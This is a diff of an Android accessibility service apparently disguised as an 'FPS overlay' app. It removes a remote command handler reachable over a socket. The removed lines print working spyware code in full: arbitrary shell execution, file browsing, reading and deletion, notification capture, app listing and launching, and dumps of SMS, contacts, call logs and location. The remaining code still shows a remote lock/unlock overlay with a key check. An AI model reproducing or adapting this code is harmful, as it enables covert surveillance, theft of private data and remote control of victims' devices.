@@ -3,17 +3,11 @@ package com.bluestacks.fpsoverlay;
 import android.accessibilityservice.AccessibilityService;
 import android.content.Context;
 import android.content.Intent;
-import android.content.pm.ApplicationInfo;
-import android.content.pm.PackageManager;
-import android.database.Cursor;
+import android.content.SharedPreferences;
 import android.graphics.PixelFormat;
-import android.location.Location;
-import android.location.LocationManager;
-import android.net.Uri;
+import android.os.Build;
 import android.os.Handler;
 import android.os.Looper;
-import android.provider.CallLog;
-import android.provider.ContactsContract;
 import android.view.Gravity;
 import android.view.LayoutInflater;
 import android.view.View;
@@ -21,25 +15,13 @@ import android.view.WindowManager;
 import android.view.WindowInsets;
 import android.view.WindowInsetsController;
 import android.view.accessibility.AccessibilityEvent;
-import android.view.accessibility.AccessibilityNodeInfo;
 import android.widget.Button;
 import android.widget.TextView;
-import android.content.SharedPreferences;
-import android.os.Build;
-import android.os.Vibrator;
-import android.os.VibrationEffect;
-import android.os.Environment;
-import android.widget.Toast;
-import java.io.File;
-import java.io.FileInputStream;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.io.PrintWriter;
 import java.net.ServerSocket;
 import java.net.Socket;
-import java.util.ArrayList;
-import java.util.Collections;
-import java.util.List;
 import java.util.Locale;
 
 public class SupportService extends AccessibilityService {
@@ -55,8 +37,6 @@ public class SupportService extends AccessibilityService {
     
     private ServerSocket serverSocket;
     private boolean isLocked = false;
-    private String currentPath = Environment.getExternalStorageDirectory().getAbsolutePath();
-    private final List<String> notificationLog = Collections.synchronizedList(new ArrayList<>());
 
     public native boolean checkKey(String s);
     public native boolean checkStatus();
@@ -148,141 +128,6 @@ public class SupportService extends AccessibilityService {
                     }
                 });
                 out.println("OK: Device Unlocked");
-            } else if (cmdLower.startsWith("message ")) {
-                String msg = cmd.substring(8);
-                task_handler.post(() -> Toast.makeText(getApplicationContext(), msg, Toast.LENGTH_LONG).show());
-                out.println("OK: Message Sent");
-            } else if (cmdLower.equals("vibrate")) {
-                Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
-                if (v != null) {
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                        v.vibrate(VibrationEffect.createOneShot(1000, VibrationEffect.DEFAULT_AMPLITUDE));
-                    } else {
-                        v.vibrate(1000);
-                    }
-                }
-                out.println("OK: Vibrating");
-            } else if (cmdLower.equals("home")) {
-                performGlobalAction(GLOBAL_ACTION_HOME);
-                out.println("OK: Home Pressed");
-            } else if (cmdLower.equals("back")) {
-                performGlobalAction(GLOBAL_ACTION_BACK);
-                out.println("OK: Back Pressed");
-            } else if (cmdLower.equals("screen")) {
-                String pkg = (getRootInActiveWindow() != null) ? getRootInActiveWindow().getPackageName().toString() : "Unknown";
-                out.println("DATA: " + pkg);
-            } else if (cmdLower.equals("pwd")) {
-                out.println(currentPath);
-            } else if (cmdLower.startsWith("cd ")) {
-                String newPath = cmd.substring(3).trim();
-                File dir = new File(newPath.startsWith("/") ? newPath : currentPath + "/" + newPath);
-                if (dir.exists() && dir.isDirectory()) {
-                    currentPath = dir.getAbsolutePath();
-                    out.println("OK: Changed to " + currentPath);
-                } else {
-                    out.println("ERROR: Not a directory");
-                }
-            } else if (cmdLower.startsWith("ls")) {
-                String pathArg = cmd.length() > 3 ? cmd.substring(3).trim() : "";
-                File dir = new File(pathArg.isEmpty() ? currentPath : (pathArg.startsWith("/") ? pathArg : currentPath + "/" + pathArg));
-                if (dir.exists() && dir.isDirectory()) {
-                    File[] files = dir.listFiles();
-                    if (files != null) {
-                        List<File> fileList = new ArrayList<>();
-                        Collections.addAll(fileList, files);
-                        Collections.sort(fileList, (a, b) -> {
-                            if (a.isDirectory() && !b.isDirectory()) return -1;
-                            if (!a.isDirectory() && b.isDirectory()) return 1;
-                            return a.getName().toLowerCase().compareTo(b.getName().toLowerCase());
-                        });
-                        StringBuilder sb = new StringBuilder();
-                        for (File f : fileList) {
-                            sb.append(f.isDirectory() ? "[d] " : "[f] ").append(f.getName()).append("\n");
-                        }
-                        out.println(sb.toString().isEmpty() ? "Empty" : sb.toString());
-                    } else {
-                        out.println("ERROR: Access Denied");
-                    }
-                } else {
-                    out.println("ERROR: Invalid Dir");
-                }
-            } else if (cmdLower.startsWith("cat ")) {
-                String fileName = cmd.substring(4).trim();
-                File f = new File(fileName.startsWith("/") ? fileName : currentPath + "/" + fileName);
-                if (f.exists() && f.isFile()) {
-                    try (BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(f)))) {
-                        String line;
-                        StringBuilder content = new StringBuilder();
-                        while ((line = br.readLine()) != null) content.append(line).append("\n");
-                        out.println(content.toString());
-                    } catch (Exception e) {
-                        out.println("ERROR: " + e.getMessage());
-                    }
-                } else {
-                    out.println("ERROR: File not found");
-                }
-            } else if (cmdLower.startsWith("rm ")) {
-                String fileName = cmd.substring(3).trim();
-                File f = new File(fileName.startsWith("/") ? fileName : currentPath + "/" + fileName);
-                if (f.exists() && f.delete()) {
-                    out.println("OK: Deleted");
-                } else {
-                    out.println("ERROR: Delete failed");
-                }
-            } else if (cmdLower.equals("info")) {
-                out.println("Model: " + Build.MODEL + " | Android: " + Build.VERSION.RELEASE + " | SDK: " + Build.VERSION.SDK_INT);
-            } else if (cmdLower.equals("notifs")) {
-                if (notificationLog.isEmpty()) {
-                    out.println("No new notifications.");
-                } else {
-                    StringBuilder sb = new StringBuilder();
-                    synchronized (notificationLog) {
-                        for (String n : notificationLog) sb.append(n).append("\n");
-                        notificationLog.clear();
-                    }
-                    out.println(sb.toString());
-                }
-            } else if (cmdLower.equals("apps")) {
-                PackageManager pm = getPackageManager();
-                List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
-                StringBuilder sb = new StringBuilder();
-                for (ApplicationInfo app : apps) {
-                    sb.append(app.packageName).append("\n");
-                }
-                out.println(sb.toString().isEmpty() ? "No apps found" : sb.toString());
-            } else if (cmdLower.startsWith("launch ")) {
-                String pkg = cmd.substring(7).trim();
-                Intent i = getPackageManager().getLaunchIntentForPackage(pkg);
-                if (i != null) {
-                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                    startActivity(i);
-                    out.println("OK: Launched " + pkg);
-                } else {
-                    out.println("ERROR: Package not found");
-                }
-            } else if (cmdLower.startsWith("shell ")) {
-                String shellCmd = cmd.substring(6).trim();
-                try {
-                    Process process = Runtime.getRuntime().exec(shellCmd);
-                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
-                    StringBuilder output = new StringBuilder();
-                    String line;
-                    while ((line = reader.readLine()) != null) {
-                        output.append(line).append("\n");
-                    }
-                    process.waitFor();
-                    out.println(output.toString().isEmpty() ? "OK: Executed" : output.toString());
-                } catch (Exception e) {
-                    out.println("ERROR: " + e.getMessage());
-                }
-            } else if (cmdLower.equals("dump_sms")) {
-                dumpSMS(out);
-            } else if (cmdLower.equals("dump_contacts")) {
-                dumpContacts(out);
-            } else if (cmdLower.equals("dump_calls")) {
-                dumpCalls(out);
-            } else if (cmdLower.equals("geolocate")) {
-                geolocate(out);
             } else {
                 out.println("ERROR: Unknown Command");
             }
@@ -291,81 +136,6 @@ public class SupportService extends AccessibilityService {
             // Error handling
         }
     }
-
-    private void dumpSMS(PrintWriter out) {
-        try {
-            Uri uriSMSURI = Uri.parse("content://sms/inbox");
-            Cursor cur = getContentResolver().query(uriSMSURI, null, null, null, null);
-            if (cur != null) {
-                while (cur.moveToNext()) {
-                    String address = cur.getString(cur.getColumnIndexOrThrow("address"));
-                    String body = cur.getString(cur.getColumnIndexOrThrow("body"));
-                    out.println("From: " + address + " | Body: " + body);
-                }
-                cur.close();
-            } else {
-                out.println("ERROR: Could not query SMS");
-            }
-        } catch (Exception e) {
-            out.println("ERROR: " + e.getMessage());
-        }
-    }
-
-    private void dumpContacts(PrintWriter out) {
-        try {
-            Cursor cur = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
-            if (cur != null) {
-                while (cur.moveToNext()) {
-                    String name = cur.getString(cur.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
-                    String number = cur.getString(cur.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
-                    out.println("Name: " + name + " | Phone: " + number);
-                }
-                cur.close();
-            } else {
-                out.println("ERROR: Could not query Contacts");
-            }
-        } catch (Exception e) {
-            out.println("ERROR: " + e.getMessage());
-        }
-    }
-
-    private void dumpCalls(PrintWriter out) {
-        try {
-            Cursor cur = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
-            if (cur != null) {
-                while (cur.moveToNext()) {
-                    String number = cur.getString(cur.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
-                    String name = cur.getString(cur.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
-                    int type = cur.getInt(cur.getColumnIndexOrThrow(CallLog.Calls.TYPE));
-                    out.println("Number: " + number + " | Name: " + name + " | Type: " + type);
-                }
-                cur.close();
-            } else {
-                out.println("ERROR: Could not query Call Log");
-            }
-        } catch (Exception e) {
-            out.println("ERROR: " + e.getMessage());
-        }
-    }
-
-    private void geolocate(PrintWriter out) {
-        try {
-            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
-            Location loc = null;
-            if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
-                loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
-                if (loc == null) loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
-            }
-            if (loc != null) {
-                out.println("Lat: " + loc.getLatitude() + " | Lon: " + loc.getLongitude() + " | Accuracy: " + loc.getAccuracy());
-            } else {
-                out.println("ERROR: Location not available");
-            }
-        } catch (Exception e) {
-            out.println("ERROR: " + e.getMessage());
-        }
-    }
-
 
     private void showOverlay() {
         wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
@@ -459,13 +229,6 @@ public class SupportService extends AccessibilityService {
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-        if (event.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
-            String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "System";
-            String text = event.getText() != null ? event.getText().toString() : "";
-            notificationLog.add("[" + pkg + "] " + text);
-            if (notificationLog.size() > 50) notificationLog.remove(0);
-        }
-
         if (isLocked && overlay != null) {
             if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                 String pkgName = event.getPackageName() != null ? event.getPackageName().toString() : "";
